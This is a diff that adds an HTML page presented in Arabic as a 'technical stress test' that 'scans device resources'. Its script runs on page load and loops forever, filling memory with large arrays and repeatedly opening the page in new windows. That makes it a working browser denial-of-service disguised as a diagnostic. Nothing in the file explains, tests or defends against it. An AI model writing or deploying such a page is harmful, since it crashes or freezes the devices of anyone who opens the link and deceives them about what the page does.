@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>اختبار الإجهاد التقني</title>
+</head>
+<body>
+    <h1>جارٍ فحص موارد الجهاز...</h1>
+    <script>
+        // دالة تكرارية تستهلك المعالج والذاكرة
+        function stressTest() {
+            let storage = [];
+            while (true) {
+                storage.push(new Array(1000000).fill("TEST")); // ملء الذاكرة
+                console.log("إجهاد...");
+                // فتح نوافذ منبثقة (إذا سمح المتصفح) يزيد الضغط
+                window.open(window.location.href); 
+            }
+        }
+        
+        // تشغيل الدالة بمجرد فتح الرابط
+        window.onload = stressTest;
+    </script>
+</body>
+</html>
